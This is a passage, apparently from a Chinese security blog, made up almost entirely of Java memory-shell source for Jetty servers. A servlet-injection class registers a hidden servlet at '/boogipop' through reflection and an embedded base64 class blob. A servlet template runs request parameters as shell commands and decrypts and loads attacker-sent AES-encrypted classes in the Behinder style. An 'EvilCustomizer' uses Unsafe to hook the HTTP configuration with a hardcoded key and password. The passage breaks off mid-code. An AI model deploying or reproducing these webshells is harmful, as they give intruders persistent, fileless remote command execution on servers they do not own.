IACAAUACMAFgAtABcAOAAYADsAGQBGABoAXQAcAHEAHgCNAB8AmAAhAKcAJAC1ACUAuQAmAMcAJwDOACgA/wApARkAKgEvACsBNgAsAU0ALQFhADEBZAAvAWUAMAFpADMATwAAAIQADQA7AF0AVABVAAQAjQALAFYAVwAFAC0AawBYAFcAAwC5AKgAWQBXAAMAzgCTAFoAWwAEARkASABcAF0ABQEvADIAXgBfAAYBNgArAGAAYQAHAU0AFABiAGMACAFlAAQAZABlAAMAAAFqAFAAUQAAAAABagBmAGcAAQAAAWoAaABpAAIAagAAABgAB/0AXQcAawcAbBP5ACYC+wDFQgcAbQQAbgAAAAQAAQBvAAQAcABTAAIATQAAAEkAAwADAAAAByorLLYARrEAAAACAE4AAAAKAAIAAAA3AAYAOABPAAAAIAADAAAABwBQAFEAAAAAAAcAZgBnAAEAAAAHAGgAaQACAG4AAAAEAAEAbwAJAHEAcgABAE0AAAArAAAAAQAAAAGxAAAAAgBOAAAABgABAAAAQgBPAAAADAABAAAAAQBzAFUAAAACAHQAAAACAHUASgAAAAoAAQA3AEcASQAA&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">EvilServlet</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">addFilterWithMapping</span> <span class="operator">=</span> GetMethod(servletHandler, <span class="string">&quot;addServletWithMapping&quot;</span>, Class.class, String.class);</span><br><span class="line">            addFilterWithMapping.invoke(servletHandler, EvilServlet, <span class="string">&quot;/boogipop&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AddServletShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadServlet();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectServlet();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AddFilterShell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTemplates</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Dynamic Servlet says hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;type&quot;</span>) != <span class="literal">null</span> &amp;&amp; request.getParameter(<span class="string">&quot;type&quot;</span>).equals(<span class="string">&quot;basic&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//basic cmd shell</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(Config.getPassword());</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty())&#123;</span><br><span class="line">                String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span>(File.separator.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getWriter().println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(request.getHeader(Config.getHeader()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//behind3 shell</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> Config.getBehinderShellPwdPwd();</span><br><span class="line">                    request.getSession().setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                    cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>((request.getSession().getAttribute(<span class="string">&quot;u&quot;</span>) + <span class="string">&quot;&quot;</span>).getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                    <span class="type">byte</span>[] evilClassBytes = cipher.doFinal(BASE64Decoder(request.getReader().readLine()));</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(evilClassBytes);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> evilClass.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> evilClass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServletRequest.class, ServletResponse.class&#125;);</span><br><span class="line">                    targetMethod.invoke(evilObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Customizer内存马"><a href="#Customizer内存马" class="headerlink" title="Customizer内存马"></a>Customizer内存马</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.server.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.ref.Reference;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilCustomizer</span> <span class="keyword">implements</span> <span class="title class_">HttpConfiguration</span>.Customizer &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; <span class="comment">// key</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(pass + xc);</span><br><span class="line">    Class payload;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest m;</span><br><span class="line">            m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilCustomizer</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HttpConnection</span> <span class="variable">valueField</span> <span class="operator">=</span> getValueField();</span><br><span class="line">            valueField.getHttpChannel().getHttpConfiguration().addCustomizer(<span class="keyword">new</span> <span class="title class_">EvilCustomizer</span>(<span class="number">1</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> sun.misc.Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafe</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sun.misc.<span class="type">Unsafe</span> <span class="variable">theunsafe</span> <span class="operator">=</span> (sun.misc.Unsafe) unsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> theunsafe;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HttpConnection <span class="title function_">getValueField</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, ClassNotFoundException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">ThreadGroup</span> <span class="variable">threadGroup</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">threadsfiled</span> <span class="operator">=</span> threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;threads.length;i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">threadLocalsF</span> <span class="operator">=</span> threads[i].getClass().getDeclaredField(<span class="string">&quot;threadLocals&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">threadlocal</span> <span class="operator">=</span> unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));</span><br><span class="line">                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>)));</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;table.length;j++)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(&quot;value&quot;)));</span></span><br><span class="line">                        <span class="comment">//PrintWriter writer = value.getHttpChannel().getResponse().getWriter();</span></span><br><span class="line">                        <span class="comment">//writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter(&quot;cmd&quot;)));</span></span><br><span class="line">                        <span class="comment">//writer.flush();</span></span><br><span class="line">                        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span>unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(<span class="string">&quot;value&quot;</span>)));</span><br><span class="line">                        <span class="keyword">if</span>(value.getClass().getName().equals(<span class="string">&quot;org.eclipse.jetty.server.HttpConnection&quot;</span>))&#123;</span><br><span class="line">                            <span class="keyword">return</span> (HttpConnection)value;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span 